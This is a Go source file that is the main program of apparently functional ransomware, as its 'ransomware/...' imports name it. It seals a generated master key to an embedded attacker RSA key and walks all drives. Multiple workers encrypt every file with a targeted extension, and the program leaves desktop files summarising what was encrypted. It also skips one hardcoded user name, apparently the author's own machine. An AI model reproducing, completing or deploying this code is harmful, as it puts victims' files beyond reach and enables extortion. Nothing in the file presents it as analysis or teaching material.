package main

import (
	"crypto/ecdsa"
	"crypto/rsa"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"os/user"
	"path/filepath"
	"ransomware/encryption"
	"ransomware/encryption/eccLib"
	"ransomware/encryption/rsaLib"
	"ransomware/io"
	"ransomware/utils"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	encryptedList []utils.FileInfo
	waitGroup     sync.WaitGroup
	sPubKey       = rsaLib.DecodeRSAPublicKey(utils.SPubKeyPem)
	NumWorkers    = runtime.NumCPU()
)

func main() {

	var currentUser *user.User
	startTime := time.Now()

	clientPubKeys, err := generateClientKeys(sPubKey)
	if err != nil {
		panic(err)
	}

	if currentUser, err = user.Current(); err != nil {
		panic(err)
	}

	if currentUser.Name == "Alex Paulo Couto" {
		return
	}

	drives := utils.GetDrives()
	encryptFiles(drives, clientPubKeys)

	defer utils.GenerateDesktopFiles(encryptedList, startTime)
}

func generateClientKeys(servPubKey *rsa.PublicKey) ([]*ecdsa.PublicKey, error) {

	var i uint16
	var childsNumber uint16 = utils.FileTypeLenght
	cMasterKey := eccLib.GenerateMasterPrivKey()

	var pubChildKeys = make([]*ecdsa.PublicKey, childsNumber)

	masterBytes := eccLib.SerializeExtendedPrivateKey(*cMasterKey)
	masterBytesEncrypted, err := encryption.RSAAESEncrypt(masterBytes, servPubKey)
	if err != nil {
		return nil, err
	}

	keyFile, err := os.Create("masterKey.encrypted")
	if err != nil {
		return nil, err
	}
	_, err = keyFile.Write(masterBytesEncrypted)
	if err != nil {
		return nil, err
	}

	for i = 0; i < childsNumber; i++ {
		pubChildKeys[i], err = recurDerivPubKey(cMasterKey, i+1, childsNumber, 3)
		if err != nil {
			fmt.Println("Failed to derive child key for index ", i+1)
		}
	}

	return pubChildKeys, nil
}

// Tries to derive child key for index i. There is a probability lower than 1 in 2^127 that a
// a given index is invalid for child derivation (https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki#private-parent-key--private-child-key). In that case, returns child of index i + dI.
// Recursive tries this method "tries" times
func recurDerivPubKey(
	parentKey *eccLib.ExtendedPrivateKey,
	i uint16,
	dI uint16,
	tries int,
) (*ecdsa.PublicKey, error) {

	if tries > 0 {
		childKey, err := eccLib.PubChildDeriv(*parentKey, i)
		if err == nil {
			return &childKey.PublicKey, nil
		}
	} else {
		return nil, errors.New("Failed to generate child key")
	}

	return recurDerivPubKey(parentKey, i+dI, dI, tries-1)
}

func encryptFiles(dirPaths []string, pubKeys []*ecdsa.PublicKey) {

	var filesToVisit = make(chan io.File)
	var ext string
	var err error

	waitGroup.Add(1)
	go func() {
		for _, dirPath := range dirPaths {
			filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {

				if d.IsDir() {

					if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
						return filepath.SkipDir
					}
				}

				if !d.IsDir() {
					info, err := d.Info()
					if err != nil {
						return err
					}
					ext = filepath.Ext(path)
					ext = strings.ToLower(ext)
					if len(ext) > 1 && ext != ".encrypted" {
						filesToVisit <- io.File{Info: info, Path: path, Extension: ext[1:]}
					}
				}
				return nil
			})
		}

		close(filesToVisit)
		defer waitGroup.Done()
	}()

	for i := 0; i < NumWorkers; i++ {
		waitGroup.Add(1)
		go func() {
			for file := range filesToVisit {
				fileType, mapContains := utils.FileType[file.Extension]

				if mapContains {
					err = io.EncryptFile(&file, encryption.ECDHAESEncrypt, pubKeys[fileType])

					if err == nil {
						encryptedList = append(encryptedList, utils.FileInfo{
							Path: file.Path, Size: int(file.Info.Size())})
					} else {
						fmt.Println(err)
					}

				}

			}
			defer waitGroup.Done()
		}()
	}

	waitGroup.Wait()
}
